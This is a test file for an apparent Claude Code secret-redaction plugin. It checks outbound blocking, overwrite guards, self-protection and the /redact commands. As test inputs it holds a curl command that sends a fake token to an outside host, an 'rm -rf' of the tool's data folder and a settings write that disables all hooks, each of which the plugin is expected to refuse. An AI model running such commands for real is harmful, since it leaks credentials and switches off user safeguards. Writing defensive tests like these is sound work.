// Hook tests for step 4 (run: claude plugin test ./plugin). Each `$` call the plugin makes is answered
// here. Fakes are built from pieces.

import type { On, SessionAppendInput } from 'claude-code'
import { expect, mock, test } from 'claude-code/testing'

const FAKE = ['ghp', 'Qw3rTy7UiOp9AsDf1GhJk5LzXc8VbNm2ZxCv'].join('_')

type Options = { settings?: Record<string, unknown>; files?: Record<string, string>; messages?: unknown[]; policy?: Record<string, unknown>; check?: boolean; submit?: boolean; mention?: string[]; compact?: boolean; env?: boolean; mentionNothing?: boolean }
const SECRET = ['acme', 'internal', 'Zq93Kd77'].join('-')

type World = { states: unknown[]; stdin: string[]; closed: string[]; clock: { now: number }; storeDown: { on: boolean }; writes: { path: string; text: string }[]; ui: string[]; ran: string[]; files: Record<string, string>; session: ReturnType<typeof mock.session> }

function world(on: On, o: Options = {}): World {
  const writes: World['writes'] = []
  const ui: string[] = []
  const ran: string[] = []
  // The engine makes a Windows path relative on other systems, so a test names files from the drive on.
  const norm = (p: string): string => {
    const n = p.replace(/\\/g, '/').replace(/^d:/, 'D:')
    return n.slice(Math.max(n.indexOf('D:/'), 0))
  }
  const files: Record<string, string> = Object.fromEntries(Object.entries(o.files ?? {}).map(([k, v]) => [norm(k), v]))
  const session = mock.session(on)
  if (o.check) on('tool.check', () => ({ decision: 'allow' }))
  if (o.submit) on('prompt.submit', (_$, e) => ({ text: e.text }))
  if (o.compact) on('session.compact', () => ({ messages: [] }))
  if (o.mentionNothing) on('prompt.mention', () => ({ type: null }))
  if (o.mention) {
    const seen = o.mention
    on('prompt.mention', (_$, e) => {
      seen.push(e.path)
      return { type: 'file' } as never
    })
  }
  on('command.register', () => ({ value: { command: 'redact' } }) as never)
  const clock = { now: 1_800_000_000_000 }
  const storeDown = { on: false }
  const states: unknown[] = []
  const stdin: string[] = []
  const closed: string[] = []
  on('clock.now', () => ({ value: clock.now }))
  on('state.set', (_$, e, next) => {
    states.push(e.value)
    return next(e)
  })
  on('ui.open', () => ({ value: { isPlaced: true } }))
  on('ui.close', (_$, e) => {
    closed.push(e.id)
    return { value: undefined }
  })
  mock.env(on, { CLAUDE_CONFIG_DIR: 'D:\\cfg', OS: 'Windows_NT' })
  on('session.id', () => ({ value: 'sess-0002' }))
  on('session.cwd', () => ({ value: 'D:\\work' }))
  on('session.surfaces', () => ({ value: ['terminal'] }))
  on('session.version', () => ({ value: { version: '2.1.316', base: '2.1.316', builtAt: 'x' } }))
  on('session.messages', () => ({ value: o.messages ?? [] }))
  on('settings.read', (_$, e) => ({ value: e.source === 'user' ? { secretShield: o.settings ?? {} } : e.source === 'policy' ? (o.policy ?? {}) : {} }))
  on('fs.exists', (_$, e) => ({ value: norm(e.path) in files }))
  on('fs.read', (_$, e) => ({ value: files[norm(e.path)] ?? '' }))
  on('fs.stat', (_$, e) => ({ value: { kind: 'file', size: (files[norm(e.path)] ?? '').length, realPath: e.path } }))
  on('fs.list', () => ({ value: o.env ? [{ name: '.env', kind: 'file', size: 60 }] : [] }))
  on('fs.write', (_$, e) => {
    writes.push({ path: e.path, text: e.text })
    files[norm(e.path)] = e.text
    return { value: undefined }
  })
  // DPAPI stood in by an echo: what goes in on stdin comes back on stdout.
  on('process.run', (_$, e) => {
    if (storeDown.on) throw new Error('store went away')
    stdin.push(e.init?.stdin ?? '')
    return { value: { exitCode: 0, stdout: e.init?.stdin ?? '', stderr: '', isStdoutTruncated: false, isStderrTruncated: false } }
  })
  on('ui.log', (_$, e) => {
    ui.push(e.text)
    return { value: undefined }
  })
  on('ui.toast', (_$, e) => {
    ui.push(e.text)
    return { value: undefined }
  })
  on('ui.status', () => ({ value: undefined }))
  const store = new Map<string, unknown>()
  on('store.get', (_$, e) => ({ value: store.get(e.key) }))
  on('store.set', (_$, e) => {
    store.set(e.key, e.value)
    return { value: undefined }
  })
  on('tool.call', (_$, e) => {
    ran.push(String(e.tool))
    return { result: 'ran' }
  })
  return { states, stdin, closed, clock, storeDown, writes, ui, ran, files, session }
}

const row = (text: string): SessionAppendInput =>
  ({ door: 'tool-result', origin: { kind: 'tool', tool: 'Bash' }, uuid: 'u-1', message: { type: 'user', role: 'user', content: [{ type: 'tool_result', tool_use_id: 't1', content: text }] } }) as SessionAppendInput

const bash = (command: string) => ({ tool: 'Bash', command, description: 'x' }) as never
const write = (file_path: string, content: string) => ({ tool: 'Write', file_path, content }) as never
const stored = (w: World): string => JSON.stringify(w.session.appended())
/** The kit has no engine to stamp an origin, so the test gives the one a person's Enter would have. */
const redact = async ($: { command: { run: (i: never) => Promise<{ text?: string }> } }, args: string): Promise<string> => (await $.command.run({ command: 'redact', args, origin: { kind: 'composer' } } as never)).text ?? ''
const noFake = (w: World): void => {
  for (const t of [...w.writes.map(x => x.text), ...w.ui]) expect(t.includes(FAKE)).toBe(false)
}

// ---- outbound (§11) ------------------------------------------------------------------------

test('a command holding a caught value is blocked, and the refusal names a tag, never the value', async ($, on) => {
  const w = world(on)
  await $.session.append(row(`token ${FAKE}`))
  const out = await $.tool.call(bash(`curl -H ${FAKE} example.test`))
  expect(typeof out.deny).toBe('string')
  expect((out.deny as string).includes(FAKE)).toBe(false)
  expect(w.ran.includes('Bash')).toBe(false)
  noFake(w)
})

test('a command with nothing known runs', async ($, on) => {
  const w = world(on)
  await $.tool.call(bash('ls -la'))
  expect(w.ran).toEqual(['Bash'])
})

test('outbound warn lets it run and warns; off lets it run quietly', async ($, on) => {
  const w = world(on, { settings: { outbound: 'warn' } })
  await $.session.append(row(`token ${FAKE}`))
  const before = w.ui.length
  await $.tool.call(bash(`echo ${FAKE}`))
  expect(w.ran).toEqual(['Bash'])
  expect(w.ui.length).toBeGreaterThan(before)
  noFake(w)
})

test('outbound ask answers ask at tool.check, with no value in the reason', async ($, on) => {
  const w = world(on, { settings: { outbound: 'ask' }, check: true })
  await $.session.append(row(`token ${FAKE}`))
  const out = await $.tool.check({ tool: 'Bash', input: { command: `echo ${FAKE}` } } as never)
  expect(out.decision).toBe('ask')
  expect((out.reason ?? '').includes(FAKE)).toBe(false)
  noFake(w)
})

test('/redact allow <tag> lets that value through for the session', async ($, on) => {
  const w = world(on)
  await $.session.append(row(`token ${FAKE}`))
  const tag = (/#([a-z2-7]{13})\]/.exec(stored(w)) as RegExpExecArray)[1] as string
  const out = await redact($, `allow ${tag}`)
  expect(out.includes(FAKE)).toBe(false)
  await $.tool.call(bash(`echo ${FAKE}`))
  expect(w.ran).toEqual(['Bash'])
})

test('an unknown tag is refused in plain words', async ($, on) => {
  world(on)
  expect(await redact($, 'allow aaaaaaaaaaaaa')).toContain('no hidden value')
})

// ---- overwrite guard (§10, R-11) ------------------------------------------------------------

test('R-11: a Write that replaces a real secret with its placeholder is blocked, once allowed it passes once', async ($, on) => {
  const file = 'D:\\work\\c.env'
  const w = world(on, { files: { [file]: `token=${FAKE}\n` } })
  await $.session.append(row(`token=${FAKE}`))
  const seen = (/\[REDACTED:[^\]]+\]/.exec(stored(w)) as RegExpExecArray)[0]
  const out = await $.tool.call(write(file, `token=${seen}\n`))
  expect(typeof out.deny).toBe('string')
  expect(w.ran.includes('Write')).toBe(false)
  await redact($, 'allow')
  await $.tool.call(write(file, `token=${seen}\n`))
  expect(w.ran).toEqual(['Write'])
  const again = await $.tool.call(write(file, `token=${seen}\n`))
  expect(typeof again.deny).toBe('string')
  noFake(w)
})

test('a placeholder written into a new file gives a notice with its line, and /redact lists it', async ($, on) => {
  const w = world(on)
  await $.session.append(row(`token ${FAKE}`))
  const seen = (/\[REDACTED:[^\]]+\]/.exec(stored(w)) as RegExpExecArray)[0]
  await $.tool.call(write('D:\\work\\config.yaml', `a: 1\nb: ${seen}\n`))
  expect(w.ui.some(l => l.includes('config.yaml') && l.includes('line 2'))).toBe(true)
  expect(await redact($, '')).toContain('config.yaml')
})

// ---- self-protection (§17) --------------------------------------------------------------------

test("Claude can't write to the tool's data folder or plugin folder", async ($, on) => {
  const w = world(on)
  for (const path of ['D:\\cfg\\secret-shield\\log\\a.jsonl', 'd:/CFG/x/../secret-shield/store/index.dpapi']) {
    expect(typeof (await $.tool.call(write(path, 'x'))).deny).toBe('string')
  }
  expect(w.ran).toEqual([])
})

test('a settings change that would switch the tool off is refused; another settings change passes', async ($, on) => {
  const file = 'D:\\work\\.claude\\settings.local.json'
  const w = world(on, { files: { [file]: '{}' } })
  expect(typeof (await $.tool.call(write(file, '{"disableAllHooks":true}'))).deny).toBe('string')
  await $.tool.call(write(file, '{"permissions":{"allow":[]}}'))
  expect(w.ran).toEqual(['Write'])
})

test('a shell command that changes a protected file is refused', async ($, on) => {
  const w = world(on)
  expect(typeof (await $.tool.call(bash('rm -rf D:/cfg/secret-shield'))).deny).toBe('string')
  expect(w.ran).toEqual([])
})

// ---- observe (§13, R-13) -----------------------------------------------------------------------

test('observe: nothing is hidden or blocked, each detection is logged as would have hidden', async ($, on) => {
  const w = world(on, { settings: { mode: 'observe' } })
  await $.session.append(row(`token ${FAKE}`))
  expect(stored(w).includes(FAKE)).toBe(true)
  await $.tool.call(bash(`echo ${FAKE}`))
  expect(w.ran).toEqual(['Bash'])
  const log = w.writes.filter(x => x.path.includes('log')).map(x => x.text).join('')
  expect(log.includes('would have hidden')).toBe(true)
  expect(log.includes(FAKE)).toBe(false)
})

test('observe: self-protection stays on (D-058)', async ($, on) => {
  const w = world(on, { settings: { mode: 'observe' } })
  expect(typeof (await $.tool.call(write('D:\\cfg\\secret-shield\\store\\index.dpapi', 'x'))).deny).toBe('string')
  expect(w.ran).toEqual([])
})

// ---- resume (§6.1, R-06) ---------------------------------------------------------------------

const old = [{ role: 'user', content: [{ type: 'text', text: `old ${FAKE}` }] }, { role: 'assistant', content: [{ type: 'text', text: 'ok' }] }]

test('R-06: history with a secret drops the next prompt with the count, and /redact allow lifts it', async ($, on) => {
  const w = world(on, { messages: old, submit: true })
  const out = await $.prompt.submit({ text: 'go on' } as never).catch(() => undefined)
  expect(JSON.stringify(out)).toContain('1 secrets')
  expect(JSON.stringify(out).includes(FAKE)).toBe(false)
  await redact($, 'allow')
  expect(JSON.stringify(await $.prompt.submit({ text: 'go on' } as never))).not.toContain('secrets')
  noFake(w)
})

test('R-06: clean history goes straight through', async ($, on) => {
  world(on, { messages: [{ role: 'user', content: [{ type: 'text', text: 'hello' }] }], submit: true })
  expect(JSON.stringify(await $.prompt.submit({ text: 'go on' } as never))).not.toContain('drop')
})

test('R-06: /compact is skipped while the block stands', async ($, on) => {
  world(on, { messages: old, compact: true })
  const out = await $.session.compact({ trigger: 'manual', messages: [] } as never)
  expect('skip' in out).toBe(true)
})

// ---- commands (§15) ---------------------------------------------------------------------------

test('R-16: /redact run by anything but the person is refused', async ($, on) => {
  on('session.start', (_$, e) => ({ cwd: e.cwd }))
  world(on)
  await $.session.start({ cwd: 'D:\\work', surface: 'terminal', isInteractive: true })
  const out = await $.command.run({ command: 'redact', args: 'allow' })
  expect(out.text ?? '').toContain('Only you')
})

test('/redact add refuses a value on the command line', async ($, on) => {
  const w = world(on)
  const out = await redact($, `add ${FAKE}`)
  expect(out.includes(FAKE)).toBe(false)
  expect(out).toContain('rotat')
  noFake(w)
})

test('/redact doctor reports what it checks, /redact self-check passes, and the report holds no fake', async ($, on) => {
  const w = world(on)
  const doctor = await redact($, 'doctor')
  for (const word of ['Claude Code', 'hooks', 'Password store', 'Settings']) expect(doctor).toContain(word)
  expect(await redact($, 'self-check')).toContain('passed')
  await redact($, 'self-check --report')
  const report = w.writes.find(x => x.path.includes('reports'))
  expect(report?.text.includes('passed')).toBe(true)
  expect(report?.text.includes('ghp_')).toBe(false)
})

test('an unknown subcommand says what there is', async ($, on) => {
  world(on)
  expect(await redact($, 'nonsense')).toContain('self-check')
})

// ---- media (§6) -------------------------------------------------------------------------------

test('media drop removes an image from a row and leaves a note; pass keeps it', async ($, on) => {
  const w = world(on, { settings: { media: 'drop' } })
  const image = { type: 'image', source: { type: 'base64', media_type: 'image/png', data: 'AAAA' } }
  await $.session.append({ door: 'tool-result', origin: { kind: 'tool', tool: 'Read' }, uuid: 'u', message: { type: 'user', role: 'user', content: [{ type: 'tool_result', tool_use_id: 't', content: [image] }] } } as never)
  expect(stored(w).includes('AAAA')).toBe(false)
  expect(stored(w)).toContain('removed')
})

// ---- @ files (§5.3) -----------------------------------------------------------------------------

test('an @ file with a secret is read from a copy with the same name and no secret', async ($, on) => {
  const file = 'D:\\work\\notes.txt'
  const seen: string[] = []
  const w = world(on, { files: { [file]: `key ${FAKE}\n` }, mention: seen })
  await $.prompt.mention({ mention: 'notes.txt', path: file })
  expect(seen[0]?.endsWith('notes.txt')).toBe(true)
  expect(seen[0]?.includes('secret-shield')).toBe(true)
  expect(Object.values(w.files).some(t => t.includes('[REDACTED:'))).toBe(true)
  expect(w.writes.some(x => x.path.endsWith('notes.txt') && !x.text.includes(FAKE))).toBe(true)
  noFake(w)
})

test('if the engine will not attach the copy, the redacted text goes as context, never the file', async ($, on) => {
  const file = 'D:\\work\\notes.txt'
  world(on, { files: { [file]: `key ${FAKE}\n` }, mentionNothing: true })
  const out = await $.prompt.mention({ mention: 'notes.txt', path: file })
  const text = JSON.stringify(out)
  expect(text.includes(FAKE)).toBe(false)
  expect(text.includes('[REDACTED:')).toBe(true)
})

test('an @ file with nothing to hide is read as it is', async ($, on) => {
  const file = 'D:\\work\\plain.txt'
  const seen: string[] = []
  world(on, { files: { [file]: 'hello\n' }, mention: seen })
  await $.prompt.mention({ mention: 'plain.txt', path: file })
  expect(seen).toEqual([file])
})

test('media drop refuses an @ image', async ($, on) => {
  world(on, { settings: { media: 'drop' } })
  const out = await $.prompt.mention({ mention: 'a.png', path: 'D:\\work\\a.png' })
  expect(typeof out.deny).toBe('string')
})

// ---- the add and learn panes (§8, R-07) ----------------------------------------------------------

const ADD = { plugin: 'secret-shield', component: 'Pane', requestId: 'secret-shield-add', surface: 'terminal', props: { title: 'Add', isFocused: true, bodyColumns: 60, placement: 'dock', scroll: { offset: 0, bodyRows: 10 }, view: {} } } as const
const LEARN = { ...ADD, requestId: 'secret-shield-learn' } as const

test('/redact add: the value reaches the store on stdin and no state, row, log or screen', async ($, on) => {
  const w = world(on)
  const ui = await $.ui.mount(ADD as never) as never as { input: (t: unknown) => Promise<unknown>; unmount: () => Promise<void> }
  await ui.input({ key: 'value', text: SECRET })
  expect(w.stdin.length).toBeGreaterThan(0)
  expect(w.closed).toEqual(['secret-shield-add'])
  for (const t of [JSON.stringify(w.states), stored(w), ...w.writes.map(x => x.text), ...w.ui]) expect(t.includes(SECRET)).toBe(false)
  await ui.unmount()
  await $.session.append(row(`seen ${SECRET} here`))
  expect(stored(w).includes(SECRET)).toBe(false)
})

test('R-07: a value already in the history gets the rotate warning with the count', async ($, on) => {
  const w = world(on, { messages: [{ role: 'user', content: [{ type: 'text', text: `mine ${SECRET}` }] }] })
  const ui = await $.ui.mount(ADD as never) as never as { input: (t: unknown) => Promise<unknown> }
  await ui.input({ key: 'value', text: SECRET })
  expect(w.ui.some(l => l.includes('already sent to the model 1 times') && l.includes('rotating'))).toBe(true)
  for (const l of w.ui) expect(l.includes(SECRET)).toBe(false)
})

test('a value that is too short is refused in the pane, and nothing is saved', async ($, on) => {
  const w = world(on)
  const ui = await $.ui.mount(ADD as never) as never as { input: (t: unknown) => Promise<unknown>; find: (q: unknown) => Promise<{ text?: string } | undefined> }
  await ui.input({ key: 'value', text: 'abc' })
  expect(w.stdin).toEqual([])
  expect((await ui.find({ type: 'Text', text: /too short/ }))?.text).toContain('too short')
})

test('a store that can not be read refuses a save, so a locked list is never replaced', async ($, on) => {
  const w = world(on)
  const ui = await $.ui.mount(ADD as never) as never as { input: (t: unknown) => Promise<unknown>; find: (q: unknown) => Promise<{ text?: string } | undefined> }
  await ui.input({ key: 'value', text: SECRET })
  const before = Object.keys(w.files).filter(k => k.includes('store')).length
  w.storeDown.on = true
  await ui.input({ key: 'value', text: `${SECRET}-2` })
  expect((await ui.find({ type: 'Text', text: /nothing was saved/ }))?.text).toContain('nothing was saved')
  expect(Object.keys(w.files).filter(k => k.includes('store')).length).toBe(before)
})

const encode = (text: string): string => btoa(String.fromCharCode(...new TextEncoder().encode(text)))
async function sha256(text: string): Promise<string> {
  const d = new Uint8Array(await crypto.subtle.digest('SHA-256', new TextEncoder().encode(text)))
  return Array.from(d, x => x.toString(16).padStart(2, '0')).join('')
}

test('a failed load warns, is tried again later, and then hides the value', async ($, on) => {
  const list = encode(JSON.stringify([{ value: SECRET, label: 'mine', added: '2026-11-01' }]))
  const index = encode(JSON.stringify({ v: 1, generation: 1, pieces: 1, checksum: await sha256(list), count: 1 }))
  const dir = 'D:\\cfg/secret-shield/store'.replace('D:\\cfg/', 'D:\\cfg\\').replace('/store', '\\store')
  const w = world(on, { files: { [`${dir}\\index.dpapi`]: index, [`${dir}\\list-1-0.dpapi`]: list } })
  w.storeDown.on = true
  await $.session.append(row('nothing here'))
  expect(w.ui.some(l => l.includes('saved secrets'))).toBe(true)
  await $.session.append(row(`${SECRET} seen`))
  expect(JSON.stringify(w.session.appended()).includes(SECRET)).toBe(true)
  w.storeDown.on = false
  w.clock.now += 120_000
  await $.session.append(row(`${SECRET} again`))
  const rows = w.session.appended()
  expect(JSON.stringify(rows[rows.length - 1]).includes(SECRET)).toBe(false)
})

test('/redact learn lists names, never values, and saves what is ticked', async ($, on) => {
  const file = 'D:\\work\\.env'
  const w = world(on, { files: { [file]: `GITHUB_TOKEN=${FAKE}\nPORT=8080\n` }, env: true })
  const said = await redact($, 'learn')
  expect(said).toContain('Found 2')
  expect(said.includes(FAKE)).toBe(false)
  expect(JSON.stringify(w.states).includes(FAKE)).toBe(false)
  const ui = await $.ui.mount(LEARN as never) as never as { press: (t: unknown) => Promise<unknown>; findAll: (q: unknown) => Promise<{ text?: string }[]> }
  const buttons = await ui.findAll({ type: 'Button' })
  expect(JSON.stringify(buttons).includes(FAKE)).toBe(false)
  expect(JSON.stringify(buttons)).toContain('[x] GITHUB_TOKEN')
  expect(JSON.stringify(buttons)).toContain('[ ] PORT')
  await ui.press({ key: 'save' })
  expect(w.closed).toEqual(['secret-shield-learn'])
  expect(w.ui.some(l => l.includes('saved 1 of 2'))).toBe(true)
})
